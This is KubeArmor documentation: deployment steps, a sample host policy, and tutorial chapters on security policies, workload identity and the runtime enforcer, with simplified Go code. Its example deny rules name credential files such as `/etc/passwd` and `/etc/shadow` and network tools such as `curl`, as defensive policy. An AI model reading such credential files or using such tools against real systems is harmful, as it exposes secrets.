* KubeArmor does not change anything with the pod/container.
* KubeArmor does not require any changes at the host level or at the CRI (Container Runtime Interface) level to enforce blocking rules. KubeArmor deploys as a non-privileged DaemonSet with certain capabilities that allows it to monitor other pods/containers and the host.
* A given cluster can have multiple nodes utilizing different LSMs. KubeArmor abstracts away complexities of LSMs and provides an easy way to enforce policies. KubeArmor manages complexity of LSMs under-the-hood.

### Post-Attack Mitigation and its flaws

![Post Attack Mitigation](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-e08f90eb2bf3d31637ce0e29cb7fec849df52443%2Fpost-attack-mitigation.png?alt=media\&token=bd4ac092-7159-4071-bec8-1edeb6b70dfd)

* Post-exploit Mitigation works by killing a suspicious process in response to an alert indicating malicious intent.
* Attacker is allowed to execute a binary. Attacker could disable security controls, access logs, etc to circumvent attack detection.
* By the time a malicious process is killed, sensitive contents could have already been deleted, encrypted, or transmitted.
* [Quoting Grsecurity](https://grsecurity.net/tetragone_a_lesson_in_security_fundamentals), “post-exploitation detection/mitigation is at the mercy of an exploit writer putting little to no effort into avoiding tripping these detection mechanisms.”

## Problems with k8s native Pod Security Context

[Pod Security Context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) allows one to specify [native AppArmor](https://kubernetes.io/docs/tutorials/security/apparmor/) or [native SELinux](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#assign-selinux-labels-to-a-container) policies.

![Pod Security Context](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-a52231d4ee36e97c9ed4d214ef7260c7e5acffcb%2Fpod%20security%20context.png?alt=media\&token=d69855c1-217e-4e7b-a8a4-4a0db89fa024)

This approach has multiple problems:

1. It is often difficult to predict which LSM (AppArmor or SELinux) would be available on the target node.
2. BPF-LSM is not supported by Pod Security Context.
3. It is difficult to manually specify an AppArmor or SELinux policy. Changing default AppArmor or SELinux policies might result in more security holes since it is difficult to decipher the implications of the changes and can be counter-productive.

### Problems with multi-cloud deployment

Different managed cloud providers use different default distributions.\
Google GKE COS uses AppArmor by default, AWS Bottlerocket uses BPF-LSM and SELinux, and AWS Amazon Linux 2 uses only SELinux by default.\
Thus it is challenging to use Pod Security Context in multi-cloud deployments.

![Multi Cloud issues with LSMs](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-e720ae9b6d4e049162c2270c1b9e7bf033e92c57%2Fmulti-cloud.png?alt=media\&token=03fe5c22-381a-4879-8e80-287a9d1af63e)

## Use of BPF-LSM

![BPF-LSM with KubeArmor](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-7f8b390d0f4342b9171ab8aa27572e3d1a79d0c5%2Fbpf-lsm.png?alt=media\&token=2b7f01f9-b246-460b-a5d7-f8d9777cfe48)

References:

* [Armoring Cloud Native Workloads with BPF-LSM](https://www.youtube.com/watch?v=uYVaiIX7QC0\&ab_channel=CNCF%5BCloudNativeComputingFoundation%5D)
* [Securing Bottlerocket deployments on Amazon EKS with KubeArmor](https://aws.amazon.com/blogs/containers/secure-bottlerocket-deployments-on-amazon-eks-with-kubearmor/)

# VM/Bare-Metal Deployment

This recipe explains how to use KubeArmor directly on a VM/Bare-Metal machine, and we tested the following steps on Ubuntu hosts.

The recipe installs `kubearmor` as systemd process and `karmor` cli tool to manage policies and show alerts/telemetry.

## Download and Install KubeArmor

1. Download the [latest release](https://github.com/kubearmor/KubeArmor/releases) or KubeArmor.
2. Install KubeArmor (VER is the kubearmor release version)

```
sudo apt --no-install-recommends install ./kubearmor_${VER}_linux-amd64.deb
```

> Note that the above command doesn't installs the recommended packages, as we ship object files along with the package file. In case you don't have BTF, consider removing `--no-install-recommends` flag.

<details>

<summary>For distributions other than Ubuntu/Debian</summary>

1. Refer [Installing BCC](https://github.com/iovisor/bcc/blob/master/INSTALL.md#installing-bcc) to install pre-requisites.
2. Download release tarball from KubeArmor releases for the version you want

```
wget https://github.com/KubeArmor/KubeArmor/releases/download/v${VER}/kubearmor_${VER}_linux-amd64.tar.gz
```

1. Unpack the tarball to the root directory:

```
sudo tar --no-overwrite-dir -C / -xzf kubearmor_${VER}_linux-amd64.tar.gz
sudo systemctl daemon-reload
```

</details>

## Start KubeArmor

```
sudo systemctl start kubearmor
```

Check the status of KubeArmor using `sudo systemctl status kubearmor` or use `sudo journalctl -u kubearmor -f` to continuously monitor kubearmor logs.

## Apply sample policy

Following policy is to deny execution of `sleep` binary on the host:

```yaml=
apiVersion: security.kubearmor.com/v1
kind: KubeArmorHostPolicy
metadata:
  name: hsp-kubearmor-dev-proc-path-block
spec:
  nodeSelector:
    matchLabels:
      kubearmor.io/hostname: "*" # Apply to all hosts
  process:
    matchPaths:
    - path: /usr/bin/sleep # try sleep 1
  action:
    Block
```

Save the above policy to *`hostpolicy.yaml`* and apply:

```
karmor vm policy add hostpolicy.yaml
```

**Now if you run `sleep` command, the process would be denied execution.**

> Note that `sleep` may not be blocked if you run it in the same terminal where you apply the above policy. In that case, please open a new terminal and run `sleep` again to see if the command is blocked.

## Get Alerts for policies and telemetry

```
karmor logs --gRPC=:32767 --json
```

```json
{
"Timestamp":1717259989,
"UpdatedTime":"2024-06-01T16:39:49.360067Z",
"HostName":"kubearmor-dev",
"HostPPID":1582,
"HostPID":2420,
"PPID":1582,
"PID":2420,
"UID":1000,
"ParentProcessName":"/usr/bin/bash",
"ProcessName":"/usr/bin/sleep",
"PolicyName":"hsp-kubearmor-dev-proc-path-block",
"Severity":"1",
"Type":"MatchedHostPolicy",
"Source":"/usr/bin/bash",
"Operation":"Process",
"Resource":"/usr/bin/sleep",
"Data":"lsm=SECURITY_BPRM_CHECK",
"Enforcer":"BPFLSM",
"Action":"Block",
"Result":"Permission denied",
"Cwd":"/"
}
```

# Wiki

KubeArmor is a **runtime security enforcement system** for containers and nodes.\
It uses *security policies* (defined as Kubernetes Custom Resources like KSP, HSP, and CSP)\
to define allowed, audited, or blocked actions for workloads.\
The system *monitors system activity* using kernel technologies such as eBPF\
and enforces the defined policies by integrating with the underlying operating system's\
security modules like AppArmor, SELinux, or BPF-LSM, sending security alerts\
and telemetry through a log feeder.

## Visual Overview

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-d3c7f60f7d3b258146ec63fa8005901c68ba00ab%2Fkubearmor_overview.png?alt=media)

# Security Policies (KSP, HSP, CSP)

Welcome to the KubeArmor tutorial! In this first chapter, we'll dive into one of the most fundamental concepts in KubeArmor: **Security Policies**. Think of these policies as the instruction manuals or rulebooks you give to KubeArmor, telling it exactly how applications and system processes should behave.

## What are Security Policies?

In any secure system, you need rules that define what is allowed and what isn't. In Kubernetes and Linux, these rules can get complicated, dealing with things like which files a program can access, which network connections it can make, or which powerful system features (capabilities) it's allowed to use.

KubeArmor simplifies this by letting you define these rules using clear, easy-to-understand **Security Policies**. You write these policies in a standard format that Kubernetes understands (YAML files, using something called Custom Resource Definitions or CRDs), and KubeArmor takes care of translating them into the low-level security configurations needed by the underlying system.

These policies are powerful because they allow you to specify security rules for different parts of your system:

1. **KubeArmorPolicy (KSP):** For individual **Containers** or **Pods** running in your Kubernetes cluster.
2. **KubeArmorHostPolicy (HSP):** For the **Nodes** (the underlying Linux servers) where your containers are running. This is useful for protecting the host system itself, or even applications running directly on the node outside of Kubernetes.
3. **KubeArmorClusterPolicy (CSP):** For applying policies across **multiple Containers/Pods** based on namespaces or labels cluster-wide.

## Why Do We Need Security Policies?

Imagine you have a web server application running in a container. This application should only serve web pages and access its configuration files. It shouldn't be trying to access sensitive system files like `/etc/shadow` or connecting to unusual network addresses.

Without security policies, if your web server container gets compromised, an attacker might use it to access or modify sensitive data, or even try to attack other parts of your cluster or network.

KubeArmor policies help prevent this by enforcing the principle of **least privilege**. This means you only grant your applications and host processes the minimum permissions they need to function correctly.

**Use Case Example:** Let's say you have a simple application container that should *never* be allowed to read the `/etc/passwd` file inside the container. We can use a KubeArmor Policy (KSP) to enforce this rule.

## Anatomy of a KubeArmor Policy

KubeArmor policies are defined as YAML files that follow a specific structure. This structure includes:

1. **Metadata:** Basic information about the policy, like its `name`. For KSPs, you also specify the `namespace` it belongs to. HSPs and CSPs are cluster-scoped, meaning they don't belong to a specific namespace.
2. **Selector:** This is how you tell KubeArmor *which* containers, pods, or nodes the policy should apply to. You typically use Kubernetes labels for this.
3. **Spec (Specification):** This is the core of the policy where you define the actual security rules (what actions are restricted) and the desired outcome (Allow, Audit, or Block).

Let's look at a simplified structure:

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy # or KubeArmorHostPolicy, KubeArmorClusterPolicy
metadata:
  name: block-etc-passwd-read
  namespace: default # Only for KSP
spec:
  selector:
    # How to select the targets (pods for KSP, nodes for HSP, namespaces/labels for CSP)
    matchLabels:
      app: my-web-app # Apply this policy to pods with label app=my-web-app
  file: # Or 'process', 'network', 'capabilities', 'syscalls'
    matchPaths:
      - path: /etc/passwd
  action: Block # What to do if the rule is violated
```

**Explanation:**

* `apiVersion` and `kind`: Identify this document as a KubeArmor Policy object.
* `metadata`: Gives the policy a name (`block-etc-passwd-read`) and specifies the namespace (`default`) it lives in (for KSP).
* `spec`: Contains the security rules.
* `selector`: Uses `matchLabels` to say "apply this policy to any Pod in the `default` namespace that has the label `app: my-web-app`".
* `file`: This section defines rules related to file access.
* `matchPaths`: We want to match a specific file path.
* `- path: /etc/passwd`: The specific file we are interested in.
* `action: Block`: If any process inside the selected containers tries to access `/etc/passwd`, the action should be to `Block` that attempt.

This simple policy directly addresses our use case: preventing the web server (`app: my-web-app`) from reading `/etc/passwd`.

## Policy Types in Detail

Let's break down the three types:

| Policy Type            | Abbreviation | Scope                                   | Selector Type(s)                                          |
| ---------------------- | ------------ | --------------------------------------- | --------------------------------------------------------- |
| KubeArmorPolicy        | KSP          | Containers / Pods (Scoped by Namespace) | `matchLabels`, `matchExpressions`                         |
| KubeArmorHostPolicy    | HSP          | Nodes / Host OS                         | `nodeSelector` (`matchLabels`)                            |
| KubeArmorClusterPolicy | CSP          | Containers / Pods (Cluster-wide)        | `selector` (`matchExpressions` on `namespace` or `label`) |

**KubeArmorPolicy (KSP)**

* Applies to pods within a specific Kubernetes namespace.
* Uses `selector.matchLabels` or `selector.matchExpressions` to pick which pods the policy applies to, based on their labels.
* Example: Block `/bin/bash` execution in all pods within the `dev` namespace labeled `role=frontend`.

**KubeArmorHostPolicy (HSP)**

* Applies to the host operating system of the nodes in your cluster.
* Uses `nodeSelector.matchLabels` to pick which nodes the policy applies to, based on node labels.
* Example: Prevent the `/usr/bin/ssh` process on nodes labeled `node-role.kubernetes.io/worker` from accessing `/etc/shadow`.

**KubeArmorClusterPolicy (CSP)**

* Applies to pods across multiple namespaces or even the entire cluster.
* Uses `selector.matchExpressions` which can target namespaces (`key: namespace`) or labels (`key: label`) cluster-wide.
* Example: Audit all network connections made by pods in the `default` or `staging` namespaces. Or, block `/usr/bin/curl` execution in all pods across the cluster except those labeled `app=allowed-tools`.

These policies become Kubernetes Custom Resources when KubeArmor is installed. You can see their definitions in the KubeArmor source code under the `deployments/CRD` directory:

* [KubeArmorPolicy CRD](https://github.com/kubearmor/KubeArmor/blob/main/wiki/deployments/CRD/KubeArmorPolicy.yaml) (KSP)
* [KubeArmorHostPolicy CRD](https://github.com/kubearmor/KubeArmor/blob/main/wiki/deployments/CRD/KubeArmorHostPolicy.yaml) (HSP)
* [KubeArmorClusterPolicy CRD](https://github.com/kubearmor/KubeArmor/blob/main/wiki/deployments/CRD/KubeArmorClusterPolicy.yaml) (CSP)

And their corresponding Go type definitions are in [types/types.go](https://github.com/kubearmor/KubeArmor/blob/main/wiki/KubeArmor/types/types.go). You don't need to understand Go or CRD internals right now, just know that these files formally define the structure and rules for creating KubeArmor policies that Kubernetes understands.

## How KubeArmor Uses Policies (Under the Hood)

You've written a policy YAML file. What happens when you apply it to your Kubernetes cluster using `kubectl apply -f your-policy.yaml`?

1. **Policy Creation:** You create the policy object in the Kubernetes API Server.
2. **KubeArmor Watches:** The KubeArmor DaemonSet (a component running on each node) is constantly watching the Kubernetes API Server for KubeArmor policy objects (KSP, HSP, CSP).
3. **Policy Discovery:** KubeArmor finds your new policy.
4. **Target Identification:** KubeArmor evaluates the policy's `selector` (or `nodeSelector`) to figure out exactly *which* pods/containers or nodes this policy applies to.
5. **Translation:** For each targeted container or node, KubeArmor translates the high-level rules defined in the policy's `spec` (like "Block access to `/etc/passwd`") into configurations for the underlying security enforcer (which could be AppArmor, SELinux, or BPF, depending on your setup and KubeArmor's configuration - we'll talk more about these later).
6. **Enforcement:** The security enforcer on that specific node is updated with the new low-level rules. Now, if a targeted process tries to do something forbidden by the policy, the enforcer steps in to `Allow`, `Audit`, or `Block` the action as specified.

Here's a simplified sequence:

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-78869a24b63c2012f1fe02248e3b527d6bd6cd4d%2Fsecurity_policy.png?alt=media)

This flow shows how KubeArmor acts as the bridge between your easy-to-write YAML policies and the complex, low-level security mechanisms of the operating system.

## Policy Actions: Allow, Audit, Block

Every rule in a KubeArmor policy (within the `spec` section) specifies an `action`. This tells KubeArmor what to do if the rule's condition is met.

* **Allow:** Explicitly permits the action. This is useful for creating "whitelist" policies where you only allow specific behaviors and implicitly block everything else.
* **Audit:** Does *not* prevent the action but generates a security alert or log message when it happens. This is great for testing policies before enforcing them or for monitoring potentially suspicious activity without disrupting applications.
* **Block:** Prevents the action from happening and generates a security alert. This is for enforcing strict "blacklist" rules where you explicitly forbid certain dangerous behaviors.

Remember the "Note" mentioned in the provided policy specifications: For system call monitoring (`syscalls`), KubeArmor currently only supports the `Audit` action, regardless of what is specified in the policy YAML.

## Conclusion

In this chapter, you learned that KubeArmor Security Policies (KSP, HSP, CSP) are your rulebooks for defining security posture in your Kubernetes environment. You saw how they use Kubernetes concepts like labels and namespaces to target specific containers, pods, or nodes. You also got a peek at the basic structure of these policies, including the selector for targeting and the spec for defining rules and actions.

Understanding policies is the first step to using KubeArmor effectively to protect your workloads and infrastructure. In the next chapter, we'll explore how KubeArmor identifies the containers and nodes it is protecting, which is crucial for the policy engine to work correctly.

# Container/Node Identity

Welcome back to the KubeArmor tutorial! In the previous chapter, we learned about KubeArmor's Security Policies (KSP, HSP, CSP) and how they define rules for what applications and processes are allowed or forbidden to do. We saw that these policies use **selectors** (like labels and namespaces) to tell KubeArmor *which* containers, pods, or nodes they should apply to.

But how does KubeArmor know *which* policy to apply when something actually happens, like a process trying to access a file? When an event occurs deep within the operating system (like a process accessing `/etc/shadow`), the system doesn't just say "a pod with label `app=my-web-app` did this". It provides low-level details like Process IDs (PID), Parent Process IDs (PPID), and Namespace IDs (like PID Namespace and Mount Namespace).

This is where the concept of **Container/Node Identity** comes in.

## What is Container/Node Identity?

Think of Container/Node Identity as KubeArmor's way of answering the question: "**Who** is doing this?".

When a system event happens on a node – maybe a process starts, a file is opened, or a network connection is attempted – KubeArmor intercepts this event. The event data includes technical details about the process that triggered it. KubeArmor needs to take these technical details and figure out if the process belongs to:

1. A specific **Container** (which might be part of a Kubernetes Pod or a standalone Docker container).
2. Or, the **Node** itself (the underlying Linux operating system, potentially running processes outside of containers).

Once KubeArmor knows *who* is performing the action (the specific container or node), it can then look up the relevant security policies that apply to that identity and decide whether to allow, audit, or block the action.

## Why is Identity Important? A Simple Use Case

Imagine you have a KubeArmorPolicy (KSP) that says: "**Block** any attempt by containers with the label `app: sensitive-data` to read the file `/sensitive/config`.":

```yaml
# simplified KSP
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-sensitive-file-read
  namespace: default
spec:
  selector:
    matchLabels:
      app: sensitive-data # Policy applies to containers/pods with this label
  file:
    matchPaths:
      - path: /sensitive/config # Specific file to protect
        readOnly: true # Protect against writes too, but let's focus on read
  action: Block # If read is attempted, block it
```

Now, suppose a process inside one of your containers tries to open `/sensitive/config`.

* **Without Identity:** KubeArmor might see an event like "Process with PID 1234 and Mount Namespace ID 5678 tried to read /sensitive/config". Without knowing *which container* PID 1234 and MNT NS 5678 belong to, KubeArmor can't tell if this process is running in a container labeled `app: sensitive-data`. It wouldn't know which policy applies!
* **With Identity:** KubeArmor sees the event, looks up PID 1234 and MNT NS 5678 in its internal identity map, and discovers "Ah, that PID and Namespace belong to Container ID `abc123def456...` which is part of Pod `my-sensitive-pod-xyz` in namespace `default`, and that pod has the label `app: sensitive-data`." Now it knows this event originated from a workload targeted by the `block-sensitive-file-read` policy. It can then apply the `Block` action.

So, identifying the workload responsible for a system event is fundamental to enforcing policies correctly.

## How KubeArmor Identifies Workloads

KubeArmor runs as a DaemonSet on each node in your Kubernetes cluster (or directly on a standalone Linux server). This daemon is responsible for monitoring system activity on that specific node. To connect these low-level events to higher-level workload identities (like Pods or Nodes), KubeArmor does a few things:

1. **Watching Kubernetes (for K8s environments):** The KubeArmor daemon watches the Kubernetes API Server for events related to Pods and Nodes. When a new Pod starts, KubeArmor gets its details:
   * Pod Name
   * Namespace Name
   * Labels (this is key for policy selectors!)
   * Container details (Container IDs, Image names)
   * Node Name where the Pod is scheduled.\
     KubeArmor stores this information.
2. **Interacting with Container Runtimes:** KubeArmor talks to the container runtime (like Docker or containerd) running on the node. It uses the Container ID (obtained from Kubernetes or by watching runtime events) to get more low-level details:
   * Container PID (the process ID of the main process inside the container as seen from the *host* OS).
   * Container Namespace IDs (specifically the PID Namespace ID and Mount Namespace ID). These IDs are crucial because system events are often reported with these namespace identifiers.
3. **Monitoring Host Processes:** KubeArmor also monitors processes running directly on the host node (outside of containers).

KubeArmor builds and maintains an internal map that links these low-level identifiers (like PID Namespace ID + Mount Namespace ID) to the corresponding higher-level identities (Container ID, Pod Name, Namespace, Node Name, Labels).

Let's visualize how this identity mapping happens and is used:

![](https://900196120-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MPsOItOtXvqxa1thD0e%2Fuploads%2Fgit-blob-888445a3fbdfa4006ad0c64c3ccec5b37932f896%2Fcontainer_node_identity.png?alt=media)

This diagram shows the two main phases:

1. **Identity Discovery:** KubeArmor actively gathers information from Kubernetes and the container runtime to build its understanding of which system identifiers belong to which workloads.
2. **Event Correlation:** When a system event occurs, KubeArmor uses the identifiers from the event (like Namespace IDs) to quickly look up the corresponding workload identity in its map.

## Looking at the Code (Simplified)

The KubeArmor code interacts with Kubernetes and Docker/containerd to get this identity information.

For Kubernetes environments, KubeArmor's `k8sHandler` watches for Pod and Node events:

```go
// KubeArmor/core/k8sHandler.go (Simplified)

// WatchK8sPods Function
func (kh *K8sHandler) WatchK8sPods(nodeName string) *http.Response {
 // ... code to build API request URL ...
 // The URL includes '?watch=true' to get a stream of events
 URL := "https://" + kh.K8sHost + ":" + kh.K8sPort + "/api/v1/pods?watch=true"

 // ... code to make HTTP request to K8s API server ...
 // Returns a response stream where KubeArmor reads events
 resp, err := kh.WatchClient.Do(req)
 if err != nil {
  return nil // Handle error
 }
 return resp
}

// ... similar functions exist to watch Nodes and Policies ...
```

This snippet shows that KubeArmor isn't passively waiting; it actively *watches* the Kubernetes API for changes using standard Kubernetes watch mechanisms. When a Pod is added, updated, or deleted, KubeArmor receives an event and updates its internal state.

For Docker (and similar logic exists for containerd), KubeArmor's `dockerHandler` can inspect running containers to get detailed information:

```go
// KubeArmor/core/dockerHandler.go (Simplified)

// GetContainerInfo Function
func (dh *DockerHandler) GetContainerInfo(containerID string, OwnerInfo map[string]tp.PodOwner) (tp.Container, error) {
 if dh.DockerClient == nil {
  return tp.Container{}, errors.New("no docker client")
 }

 // Ask the Docker daemon for details about a specific container ID
 inspect, err := dh.DockerClient.ContainerInspect(context.Background(), containerID)
 if err != nil {
  return tp.Container{}, err // Handle error
 }

 container := tp.Container{}
 container.ContainerID = inspect.ID
 container.ContainerName = strings.TrimLeft(inspect.Name, "/")

 // Get Kubernetes specific labels if available (e.g., for Pod name, namespace)
 containerLabels := inspect.Config.Labels
 if val, ok := containerLabels["io.kubernetes.pod.namespace"]; ok {
  container.NamespaceName = val
 }
 if val, ok := containerLabels["io.kubernetes.pod.name"]; ok {
  container.EndPointName = val // In KubeArmor types, EndPoint often refers to a Pod or standalone Container
 }
    // ... get other details like image, apparmor profile, privileged status ...

 // Get the *host* PID of the container's main process
 pid := strconv.Itoa(inspect.State.Pid)

 // Read /proc/<host-pid>/ns/pid and /proc/<host-pid>/ns/mnt to get Namespace IDs
 if data, err := os.Readlink(filepath.Join(cfg.GlobalCfg.ProcFsMount, pid, "/ns/pid")); err == nil {
  fmt.Sscanf(data, "pid:[%d]\n", &container.PidNS)
 }
 if data, err := os.Readlink(filepath.Join(cfg.GlobalCfg.ProcFsMount, pid, "/ns/mnt")); err == nil {
  fmt.Sscanf(data, "mnt:[%d]\n", &container.MntNS)
 }

    // ... store labels, etc. ...

 return container, nil
}
```

This function is critical. It takes a `containerID` and retrieves its associated Namespace IDs (`PidNS`, `MntNS`) by reading special files in the `/proc` filesystem on the host, which link the host PID to the namespaces it belongs to. It also retrieves labels and other useful information directly from the container runtime's inspection data.

This collected identity information is stored internally. For example, the `SystemMonitor` component maintains a map (`NsMap`) to quickly look up a workload based on Namespace IDs:

```go
// KubeArmor/monitor/processTree.go (Simplified)

// NsKey Structure (used as map key)
type NsKey struct {
 PidNS uint32
 MntNS uint32
}

// LookupContainerID Function
// This function is used when an event comes in with PidNS and MntNS
func (mon *SystemMonitor) LookupContainerID(pidns, mntns uint32) string {
 key := NsKey{PidNS: pidns, MntNS: mntns}

 mon.NsMapLock.RLock() // Use read lock for looking up
 defer mon.NsMapLock.RUnlock()

 if val, ok := mon.NsMap[key]; ok {
  // If the key (Namespace IDs) is in the map, return the ContainerID
  return val
 }

 // Return empty string if not found (might be a host process)
 return ""
}

// AddContainerIDToNsMap Function
// This function is called when KubeArmor discovers a new container
func (mon *SystemMonitor) AddContainerIDToNsMap(containerID string, namespace string, pidns, mntns uint32) {
 key := NsKey{PidNS: pidns, MntNS: mntns}

 mon.NsMapLock.Lock() // Use write lock for modifying the map
 defer mon.NsMapLock.Unlock()

 // Store the mapping: Namespace IDs -> Container ID
 mon.NsMap[key] = containerID

    // ... also updates other maps related to namespaces and policies ...
}
```

These functions from `processTree.go` show how KubeArmor builds and uses the core identity mapping: it stores the relationship between Namespace IDs (found in system events) and the Container ID, allowing it to quickly identify which container generated an event.

## Identity Types Summary

KubeArmor primarily identifies workloads using the following:

| Workload Type | Key Identifiers Monitored/Used                                                  | Source of Information             |
| ------------- | ------------------------------------------------------------------------------- | --------------------------------- |
| **Container** | Container ID, PID Namespace ID, Mount Namespace ID, Pod Name, Namespace, Labels | Kubernetes API, Container Runtime |
| **Node**      | Node Name, Node Labels, Operating System Info                                   | Kubernetes API, Host OS APIs      |

This allows KubeArmor to apply the correct security policies, whether they are KSPs (targeting Containers/Pods based on labels/namespaces) or HSPs (targeting Nodes based on node labels).

## Conclusion

Understanding Container/Node Identity is key to grasping how KubeArmor works. It's the crucial step where KubeArmor translates low-level system events into the context of your application workloads (containers in pods) or your infrastructure (nodes). By maintaining a map of system identifiers to workload identities, KubeArmor can accurately determine which policies apply to a given event and enforce your desired security posture.

In the next chapter, we'll look at the component that takes this identified event and the relevant policy and makes the decision to allow, audit, or block the action.

# Runtime Enforcer

Welcome back! In the previous chapter, we learned how KubeArmor figures out **who** is performing an action on your system by understanding **Container/Node Identity**. We saw how it maps low-level system details like Namespace IDs to higher-level concepts like Pods, containers, and nodes, using information from the Kubernetes API and the container runtime.

Now that KubeArmor knows *who* is doing something, it needs to decide if that action is allowed. This is the job of the **Runtime Enforcer**.

## What is the Runtime Enforcer?

Think of the Runtime Enforcer as the actual security guard positioned at the gates and doors of your system. It receives the security rules you defined in your Security Policies (KSP, HSP, CSP). But applications and the operating system don't directly understand KubeArmor policy YAML!

The Runtime Enforcer's main task is to translate these high-level KubeArmor rules into instructions that the underlying operating system's built-in security features can understand and enforce. These OS security features are powerful mechanisms within the Linux kernel designed to control what processes can and cannot do. Common examples include:

* **AppArmor:** Used by distributions like Ubuntu, Debian, and SLES. It uses security *profiles* that define access controls for individual programs (processes).
* **SELinux:** Used by distributions like Fedora, CentOS/RHEL, and Alpine Linux. It uses a system of *labels* and rules to control interactions between processes and system resources.
* **BPF-LSM:** A newer mechanism using eBPF programs attached to Linux Security Module (LSM) hooks to enforce security policies directly within the kernel.

When an application or process on your node or inside a container attempts to do something (like open a file, start a new process, or make a network connection), the Runtime Enforcer (via the configured OS security feature) steps in. It checks the translated rules that apply to the identified workload and tells the operating system whether to **Allow**, **Audit**, or **Block** the action.

## Why Do We Need a Runtime Enforcer? A Use Case Revisited

Let's go back to our example: preventing a web server container (with label `app: my-web-app`) from reading `/etc/passwd`.

In Chapter 1, we wrote a KubeArmor Policy for this:

```yaml
# simplified KSP
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-etc-passwd-read
  namespace: default
spec:
  selector:
    matchLabels:
      app: my-web-app # Policy applies to containers/pods with this label
  file:
    matchPaths:
      - path: /etc/passwd # Specific file to protect
        # No readOnly specified means all access types are subject to 'action'
  action: Block # What to do if the rule is violated
```

In Chapter 2, we saw how KubeArmor's Container/Node Identity component identifies that a specific process trying to read `/etc/passwd` belongs to a container running a Pod with the label `app: my-web-app`.

Now, the Runtime Enforcer takes over:

1. It knows the action is "read file `/etc/passwd`".
2. It knows the actor is the container identified as having the label `app: my-web-app`.
3. It looks up the applicable policies for this actor and action.
4. It finds the `block-etc-passwd-read` policy, which says `action: Block` for `/etc/passwd`.
5. The Runtime Enforcer, using the underlying OS security module, tells the Linux kernel to **Block** the read attempt.

The application trying to read the file will receive a "Permission denied" error, and the attempt will be stopped *before* it can succeed.

## How KubeArmor Selects and Uses an Enforcer

KubeArmor is designed to be flexible and work on different Linux systems. It doesn't assume a specific OS security module is available. When KubeArmor starts on a node, it checks which security modules are enabled and supported on that particular system.

You can configure KubeArmor to prefer one enforcer over another using the `lsm.lsmOrder` configuration option. KubeArmor will try to initialize the enforcers in the specified order (`bpf`, `selinux`, `apparmor`) and use the first one that is available and successfully initialized. If none of the preferred ones are available, it falls back to any other supported, available LSM. If *no* supported enforcer can be initialized, KubeArmor will run in a limited capacity (primarily for monitoring, not enforcement).

You can see KubeArmor selecting the LSM in the `NewRuntimeEnforcer` function (from `KubeArmor/enforcer/runtimeEnforcer.go`):

```go
// KubeArmor/enforcer/runtimeEnforcer.go (Simplified)

func NewRuntimeEnforcer(node tp.Node, pinpath string, logger *fd.Feeder, monitor *mon.SystemMonitor) *RuntimeEnforcer {
 // ... code to check available LSMs on the system ...

 // This selectLsm function tries to find and initialize the best available enforcer
 return selectLsm(re, cfg.GlobalCfg.LsmOrder, availablelsms, lsms, node, pinpath, logger, monitor)
}

// selectLsm Function (Simplified logic)
func selectLsm(re *RuntimeEnforcer, lsmOrder, availablelsms, supportedlsm []string, node tp.Node, pinpath string, logger *fd.Feeder, monitor *mon.SystemMonitor) *RuntimeEnforcer {
 // Try LSMs in preferred order first
 // If preferred fails or is not available, try others

 if kl.ContainsElement(supportedlsm, "bpf") && kl.ContainsElement(availablelsms, "bpf") {
  // Attempt to initialize BPFEnforcer
  re.bpfEnforcer, err = be.NewBPFEnforcer(...)
  if re.bpfEnforcer != nil {
   re.EnforcerType = "BPFLSM"
   // Success, return BPF enforcer
   return re
  }
  // BPF failed, try next...
 }

 if kl.ContainsElement(supportedlsm, "apparmor") && kl.ContainsElement(availablelsms, "apparmor") {
  // Attempt to initialize AppArmorEnforcer
  re.appArmorEnforcer = NewAppArmorEnforcer(...)
  if re.appArmorEnforcer != nil {
   re.EnforcerType = "AppArmor"
   // Success, return AppArmor enforcer
   return re
  }
  // AppArmor failed, try next...
 }

 if !kl.IsInK8sCluster() && kl.ContainsElement(supportedlsm, "selinux") && kl.ContainsElement(availablelsms, "selinux") {
  // Attempt to initialize SELinuxEnforcer (only for host policies outside K8s)
  re.seLinuxEnforcer = NewSELinuxEnforcer(...)
  if re.seLinuxEnforcer != nil {
   re.EnforcerType = "SELinux"
   // Success, return SELinux enforcer
   return re
  }
  // SELinux failed, try next...
 }

 // No supported/available enforcer found
 return nil
}

```

This snippet shows that KubeArmor checks for available LSMs (`lsms`) and attempts to initialize its corresponding enforcer module (`be.NewBPFEnforcer`, `NewAppArmorEnforcer`, `NewSELinuxEnforcer`) based on configuration and availability. The first one that succeeds becomes the active `EnforcerType`.

Once an enforcer is selected and initialized, the KubeArmor Daemon on the node loads the relevant policies for the workloads it is protecting and translates them into the specific rules required by the chosen enforcer.

## The Enforcement Process: Under the Hood

When KubeArmor needs to enforce a policy on a specific container or node, here's a simplified flow:

1. **Policy Change/Discovery:** A KubeArmor Policy (KSP, HSP, or CSP) is applied or changed via the Kubernetes API. The KubeArmor Daemon on the relevant node detects this.
2. **Identify Affected Workloads:** The daemon determines which specific containers or the host node are targeted by this policy change using the selectors and its internal Container/Node Identity mapping.
3. **Translate Rules:** For each affected workload, the daemon takes the high-level policy rules (e.g., Block access to `/etc/passwd`) and translates them into the low-level format required by the *active* Runtime Enforcer (AppArmor, SELinux, or BPF-LSM).
